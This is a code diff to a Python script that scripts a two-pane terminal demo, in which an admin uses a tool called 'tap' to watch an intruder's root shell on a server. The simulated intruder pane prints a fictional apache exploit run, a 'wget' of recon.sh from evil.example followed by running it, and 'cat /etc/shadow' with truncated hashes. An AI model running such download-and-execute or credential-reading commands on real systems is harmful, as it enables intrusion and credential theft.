@@ -79,10 +79,16 @@ def admin_prompt():
     return f"{BOLD}{RED}root@web-prod{RESET}:{BOLD}{BLUE}~{RESET}# "
 
 
+def kali_prompt():
+    """Attacker's local laptop prompt — shown during the preamble while
+    they run their apache 0day exploit."""
+    return f"{BOLD}{CYAN}kali@kali{RESET}:{BOLD}{BLUE}~/exploits{RESET}$ "
+
+
 def hacker_prompt():
-    """ops escalated to euid 0 — bash relabels itself as root@. The picker
-    still shows ops as the loginuid, which is how the operator spots the
-    privesc."""
+    """The compromised pty on web-prod — bash spawned by the privesc
+    payload. Whatever the kernel knows about it is what tap sees: euid 0,
+    loginuid www-data."""
     return f"{BOLD}{RED}root@web-prod{RESET}:{BOLD}{BLUE}~{RESET}# "
 
 
@@ -99,17 +105,41 @@ def hacker_prompt():
 #   t=50..60: admin detaches, kills, picker refreshes
 #   t=60..65: clean state on both sides
 
-# Initial prompts. Admin starts as alice (regular user); she sudoes to
-# root before running tap, since only root can attach to other root ptys.
+# Initial state. Admin: alice on web-prod (pre-sudo). Suspect: attacker on
+# their own kali laptop, about to run their apache 0day. Once the privesc
+# lands, the suspect's terminal stays on kali but it's now interacting
+# with bash on web-prod via the exploit's interactive payload.
 ADMIN = "admin"
 HACKER = "hacker"
 at(0.0, ADMIN,  "\x1b[2J\x1b[H" + alice_prompt())
-at(0.0, HACKER, "\x1b[2J\x1b[H" + hacker_prompt())
+at(0.0, HACKER, "\x1b[2J\x1b[H" + kali_prompt())
+
+# ── Suspect preamble: kali → web-prod via apache 0day ──
+# T_INTRUSION marks when the attacker's exploit lands them in an
+# interactive root bash on web-prod. Everything in the original
+# storyboard (wget recon, /etc/shadow dump, rootkit fetch) hangs off
+# this anchor — keep it as a single constant so timing is easy to read.
+T_INTRUSION = 4.5
+t = 0.4
+t = type_str(t, HACKER, "./apache-0day --target web-prod", cps=18)
+at(t + 0.20, HACKER, "\r\n")
+at(t + 0.30, HACKER, f"{CYAN}[*]{RESET} apache CVE-2026-XXXXX  range header heap UAF\r\n")
+at(t + 0.50, HACKER, f"{CYAN}[*]{RESET} target: https://web-prod (apache/2.4.58)\r\n")
+at(t + 0.70, HACKER, f"{CYAN}[*]{RESET} memory corruption confirmed in worker pid=4421\r\n")
+at(t + 0.90, HACKER, f"{GREEN}[+]{RESET} stage1: shell as www-data\r\n")
+at(t + 1.05, HACKER, f"{CYAN}[*]{RESET} chaining local kernel privesc... ")
+at(t + 1.55, HACKER, f"{GREEN}ok{RESET}\r\n")
+at(t + 1.70, HACKER, f"{GREEN}[+]{RESET} stage2: euid=0 acquired\r\n")
+at(t + 1.85, HACKER, f"{GREEN}[+]{RESET} spawning interactive bash on target...\r\n\r\n")
+# The pty on web-prod's bash side starts here — this is what alice will
+# see when she taps in.
+at(T_INTRUSION, HACKER, hacker_prompt())
 
 # ── Admin: sudo -i to become root ──
-# In real life alice was paged about an unknown root session on web-prod;
-# she ssh'd in and is sudo'ing now to investigate.
-t_sudo = 1.5
+# Auditd flagged the unexpected euid transition under apache and paged
+# alice about a minute later (off-screen). She ssh's to web-prod and
+# sudoes now. T_INTRUSION + 1.5s leaves a beat for the page to register.
+t_sudo = T_INTRUSION + 1.5
 t_sudo = type_str(t_sudo, ADMIN, "sudo -i", cps=14)
 at(t_sudo + 0.20, ADMIN, "\r\n")
 at(t_sudo + 0.40, ADMIN, "[sudo] password for alice: ")
@@ -118,7 +148,7 @@ at(t_sudo + 1.30, ADMIN, "Last login: Mon Apr 30 14:03:11 2026 from 10.0.0.42\r\
 at(t_sudo + 1.40, ADMIN, admin_prompt())
 
 # ── Hacker: wget recon tool ──
-t = 1.0
+t = T_INTRUSION + 1.0
 t = type_str(t, HACKER, "wget http://evil.example/recon.sh", cps=14)
 at(t + 0.20, HACKER, "\r\n")
 at(t + 0.45, HACKER, f"--2026-04-30 14:00:01--  http://evil.example/recon.sh\r\n")
@@ -133,7 +163,7 @@ t = t + 1.85
 at(t, HACKER, hacker_prompt())
 
 # ── Admin: opens picker ──
-t_admin = 4.5
+t_admin = T_INTRUSION + 4.5
 t_admin = type_str(t_admin, ADMIN, "tap", cps=10)
 at(t_admin + 0.30, ADMIN, "\r\n")
 
@@ -206,7 +236,7 @@ emit_picker(
 )
 
 # ── Hacker: chmod + run ──
-t = 5.0
+t = T_INTRUSION + 5.0
 t = type_str(t, HACKER, "chmod +x recon.sh && ./recon.sh", cps=14)
 at(t + 0.20, HACKER, "\r\n")
 at(t + 0.30, HACKER, f"{CYAN}[recon]{RESET} starting subnet sweep on 10.0.0.0/24...\r\n")
@@ -219,7 +249,7 @@ t = t + 1.30
 at(t, HACKER, hacker_prompt())
 
 # ── Admin: refresh picker preview to reflect new hacker state ──
-t_admin2 = 8.0
+t_admin2 = T_INTRUSION + 8.0
 emit_picker(
     t_admin2,
     highlight_root=True,
@@ -234,21 +264,45 @@ emit_picker(
 )
 
 # ── Hacker: starts something more incriminating ──
-# Recon prompt has been visible since ~t=8.6, so the cursor sits at a
+# Recon prompt is visible by T_INTRUSION + 8.6, so the cursor sits at a
 # fresh prompt before this typing begins.
-t = 9.0
+t = T_INTRUSION + 9.0
 t = type_str(t, HACKER, "cat /etc/shadow", cps=14)
 at(t + 0.20, HACKER, "\r\n")
 
 # ── Admin: presses Enter to attach ──
-t_attach = 10.5
+# When tap connects to a pty, the user gets the pty's actual on-screen
+# state — not just whatever was typed last. Reproduce that by repainting
+# everything that's been written to pty 4's bash since it spawned: the
+# wget recon, the chmod + ./recon.sh, and the just-typed cat /etc/shadow.
+# Cursor lands on the line after `cat /etc/shadow\r\n`, ready for the
+# shadow output to flow next.
+t_attach = T_INTRUSION + 10.5
+attach_snapshot = (
+    f"{DIM}[tap connect pty=4 (www-data → euid 0) — Ctrl-T to detach]{RESET}\r\n"
+    + hacker_prompt() + "wget http://evil.example/recon.sh\r\n"
+    + "--2026-04-30 14:00:01--  http://evil.example/recon.sh\r\n"
+    + "Resolving evil.example... 192.0.2.66\r\n"
+    + "Connecting to evil.example|192.0.2.66|:80... connected.\r\n"
+    + "HTTP request sent, awaiting response... 200 OK\r\n"
+    + "Length: 8421 (8.2K) [application/x-sh]\r\n"
+    + "Saving to: 'recon.sh'\r\n\r\n"
+    + "recon.sh           100%[==========>]   8.22K  --.-KB/s    in 0.001s\r\n\r\n"
+    + "2026-04-30 14:00:02 (8.21 MB/s) - 'recon.sh' saved\r\n\r\n"
+    + hacker_prompt() + "chmod +x recon.sh && ./recon.sh\r\n"
+    + f"{CYAN}[recon]{RESET} starting subnet sweep on 10.0.0.0/24...\r\n"
+    + f"{CYAN}[recon]{RESET} 10.0.0.1 (gw)    open: 22 80 443\r\n"
+    + f"{CYAN}[recon]{RESET} 10.0.0.5 (db)    open: 22 5432 6379\r\n"
+    + f"{CYAN}[recon]{RESET} 10.0.0.7 (auth)  open: 22 443 8443\r\n"
+    + f"{CYAN}[recon]{RESET} 10.0.0.12 (api)  open: 22 80 443 9090\r\n"
+    + f"{CYAN}[recon]{RESET} sweep complete: 4 hosts, 13 open ports\r\n\r\n"
+    + hacker_prompt() + "cat /etc/shadow\r\n"
+)
 at(t_attach, ADMIN, "\x1b[2J\x1b[H")
-at(t_attach + 0.05, ADMIN, f"{DIM}[tap connect pty=4 root@web-prod — Ctrl-T to detach]{RESET}\r\n")
-# Mirror what's on hacker's screen
-at(t_attach + 0.10, ADMIN, hacker_prompt() + "cat /etc/shadow\r\n")
+at(t_attach + 0.05, ADMIN, attach_snapshot)
 
 # Hacker continues — output of cat /etc/shadow flows to both screens
-t = 11.0
+t = T_INTRUSION + 11.0
 shadow_lines = [
     f"root:$6$xS9Lk$abc...truncated.../:19710:0:99999:7:::\r\n",
     f"alice:$6$pY3xQ$def...truncated.../:19710:0:99999:7:::\r\n",
